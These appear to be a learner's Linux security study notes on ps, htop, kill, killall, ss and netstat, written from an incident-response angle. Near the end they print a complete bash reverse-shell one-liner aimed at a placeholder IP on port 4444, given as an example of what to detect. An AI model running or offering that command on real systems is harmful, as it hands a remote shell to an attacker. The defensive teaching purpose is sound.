### What I tried
- The tree view (`F5`) shows **parent-child relationships** — which process spawned which. A web server spawning a shell spawning `curl` is a red flag. That's the value: **seeing lineage**, not just a "list view."
- Never assume a PID. Always read it from the actual process output.
- Multiple SSH daemon processes run on a normal server (one per connection). If you `killall sshd`, you kill **every** SSH session — including yours. You'd lock yourself out. That's why investigators use `kill PID` for critical services.
- - `n` = **numeric** — don't resolve DNS. Shows raw IPs and port numbers instead of hostnames. You said "shows address" — close, but the key is **numeric, no DNS resolution**. That's why it's faster and why security people use it (no leaked DNS queries).
- `127.0.0.1` is only reachable from the **same machine**. It's called **loopback** or **localhost**. It's not "the local network" (that would be something like `192.168.1.0/24`).
	- `0.0.0.0:22` = all interfaces. Reachable from anywhere (internet if firewall allows, LAN, localhost).
	- `127.0.0.1:22` = loopback only. **Only reachable from processes on this exact machine.** Even another machine on your LAN cannot reach it.
		**Why this matters:** A service bound to `127.0.0.1` is much safer than one bound to `0.0.0.0`. If you're hardening a system, you want services bound to `127.0.0.1` unless they absolutely need external access.

### What I learned
- `ps` stands for **process status**. It shows you a snapshot of the processes running on the system at that moment.By itself, `ps` shows only your current shell's processes. Not very useful.
- `ps aux` is the combination you'll use constantly:

|Flag|What it does|
|---|---|
|`a`|Show processes from **all** users (not just yours)|
|`u`|Show in **user-oriented format** (includes CPU, memory, start time)|
|`x`|Include processes **not attached to a terminal** (daemons, background services)|
	**Together:** `ps aux` shows every process on the system, with details.
- `ps aux | head -10` -> You'll see columns like:
```
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.1 168352 13024 ?        Ss   Sep20   0:02 /sbin/init
darkhand  1234  0.0  0.2  12345  6789 pts/0    S    10:00   0:00 bash
```

|Column|Meaning|
|---|---|
|`USER`|Who owns the process|
|`PID`|Process ID (unique number)|
|`%CPU`|CPU usage percentage|
|`%MEM`|Memory usage percentage|
|`VSZ`|Virtual memory size|
|`RSS`|Resident Set Size (actual physical memory used)|
|`TTY`|Terminal the process is attached to (`?` = no terminal)|
|`STAT`|Process state|
|`START`|When the process started|
|`TIME`|Total CPU time used|
|`COMMAND`|The actual command being run|
- Process states (STAT column)

|Code|Meaning|
|---|---|
|`R`|Running|
|`S`|Sleeping (waiting for something)|
|`D`|Uninterruptible sleep (usually waiting on I/O)|
|`Z`|Zombie (finished but parent hasn't collected exit status)|
|`T`|Stopped|
|`s`|Session leader|
|`l`|Multi-threaded|
- Security depth: How attackers use `ps aux`
	- **Reconnaissance:** After getting a foothold, one of the first things an attacker does is run `ps aux` to see:
		- What services are running (databases, web servers, security tools).
		- Whether monitoring/EDR tools are running (so they can avoid them).
		- What user accounts are active.
		- Whether other attackers are already present.
	- **Persistence detection:** Investigators run `ps aux` to look for:
		- Unexpected processes (e.g., `nc`, `bash -i`, unusual binaries).
		- Processes running as root that shouldn't be.
		- Processes with no TTY (`?`) that look like reverse shells or backdoors.
- `htop` is like `ps aux`, but **live and interactive**. It refreshes every second, shows color-coded bars for CPU and memory, and lets you interact with processes.
	- What you'll see
		- **Top rows:** CPU, memory, and swap usage bars.
		- **Middle:** A list of all running processes, sorted by CPU usage.
		- **Bottom:** Function keys (F1–F10) for actions.
- Key keyboard shortcuts inside `htop`

|Key|What it does|
|---|---|
|`F6`|Sort by a column (CPU, memory, etc.)|
|`F4`|Filter processes (type a substring)|
|`F5`|Toggle tree view (shows parent-child relationships)|
|`F9`|Kill a process|
|`F10` or `q`|Quit|
- Once you know `ps aux`, you combine it with everything else you learned:
	1. **Find processes by name:**
		`ps aux | grep sshd`
	2. **Find processes running as root:**
		`ps aux | awk '$1=="root" {print $2, $11}'`
	3. **Find processes with no TTY (often backdoors):**
		`ps aux | awk '$7=="?" {print $2, $11}'`
	4. **Count processes by user:**
		`ps aux | awk '{print $1}' | sort | uniq -c | sort -nr`
	5. **Find suspicious binaries running from /tmp:**
		`ps aux | grep "/tmp/"`
	**This is where the pipeline comes back:** `awk` + `sort` + `uniq` + `ps aux` = real investigation.
- Kill sends a signal to a process and the most common use is to terminate a process. The syntax is `kill PID` where PID is the affected process ID number which could be gotten from `ps aux` and `htop`.
	- **Default signal:** `SIGTERM` (signal 15) — politely ask the process to stop. It can finish what it's doing and exit cleanly.
	- **Force kill:** `SIGKILL` (signal 9) — cannot be ignored. The process is terminated immediately, no cleanup.
		`kill -9 PID`
	**Why a security person cares:**
	- Stop a malicious process without rebooting.
	- Investigators may **avoid** killing a process — they want to observe it first, or take a memory dump before terminating it.
     - `kill -9` skips cleanup, which might leave temporary files or partial writes.
 - The reason an investigator might **not** kill a process is:
	- They want to **observe** what it does (network connections, files it touches, commands it runs).
	- They want to **capture memory** before the process exits (memory forensics).
	- Killing it might **alert the attacker** that they've been discovered.
	- Killing it might trigger a **dead man's switch** (some malware runs cleanup or damage if terminated).
- `killall` kills processes **by name**, not by PID.
	`killall firefox` -> This kills every process named `firefox`.
**Options:**

| Flag                          | What it does                              |
| ----------------------------- | ----------------------------------------- |
| `killall firefox`             | Send SIGTERM to all `firefox` processes   |
| `killall -9 firefox`          | Send SIGKILL to all `firefox` processes   |
| `killall -i firefox`          | Interactive — ask before killing each one |
| `killall -u darkhand firefox` | Only kill processes owned by `darkhand`   |
- Why a security person cares
		- **Faster than `kill`** when you know the process name.
	- **Dangerous** because it affects **all** processes with that name — including legitimate ones.
	- **During incident response:** If you find a malicious process named `nc` (netcat), `killall nc` stops it immediately. But if `nc` is used legitimately by some service, you might cause collateral damage.
	**The tradeoff:**
	- `kill PID` = precise, affects one process.
	- `killall name` = fast, affects all processes with that name.
- `netstat` / `ss` are used for showing **network connections** on the system: what's listening, what's connected, and to whom.
	- `netstat` — older tool, still on many systems.
	- `ss` — modern replacement (`netstat` may not be installed on newer distros).
		- They do roughly the same thing. `ss` is faster and shows more detail.
	- The flags you need

|Flag|What it shows|
|---|---|
|`-t`|TCP connections|
|`-u`|UDP connections|
|`-l`|Listening sockets (services waiting for connections)|
|`-n`|Show numeric addresses (don't resolve DNS)|
|`-p`|Show the **process** using each socket (needs root)|
	**Combined:** `-tulnp` is the standard "show me everything" command.
	`sudo ss -tulnp`
	`sudo netstat -tulnp`
	**Why `sudo`?** To see the process name for each connection (`-p`), you need root access.
```

Netid  State   Recv-Q  Send-Q  Local Address:Port   Peer Address:Port   Process
tcp    LISTEN  0       128     0.0.0.0:22           0.0.0.0:*           users:(("sshd",pid=1234,fd=3))
tcp    LISTEN  0       128     127.0.0.1:631        0.0.0.0:*           users:(("cupsd",pid=2345,fd=7))
udp    UNCONN  0       0       0.0.0.0:68           0.0.0.0:*           users:(("dhclient",pid=3456,fd=6))

What each line means:

- Local Address:Port — what the service is listening on. `0.0.0.0` = all interfaces (world-accessible). `127.0.0.1` = localhost only (not reachable from outside).
- Peer Address:Port — who's connected (for established connections).
- Process — which program is using that port (needs `-p`).
```
- Without root, the kernel hides process information for connections you don't own. You'd see the connection but not **which process** owns it. With `sudo`, you see the process name and PID for every connection.
	**Security reason:** This prevents an unprivileged user from casually mapping which services other users are running on which ports.
- A **PID** is a process ID (like `7530` for your `sleep`).
- A **port** is a network endpoint (like `22` for SSH, `80` for HTTP).
- **Port 4444 is the default port for Metasploit reverse shells.** It's also commonly used in other hacker tooling. Seeing a service listening on port 4444 is a **massive red flag** — it's almost always malicious.
- `bash -i >& /dev/tcp/203.0.113.5/4444 0>&1` -> **Port 4444.** That's not a coincidence. It's the standard port for a reverse shell.
	- Port 4444 = common Metasploit / reverse shell port.
	- Other suspicious ports: 1337 (leet), 31337 (elite), 6666, 6667 (IRC — often used for C2) - Seeing any of these listening is worth investigating.
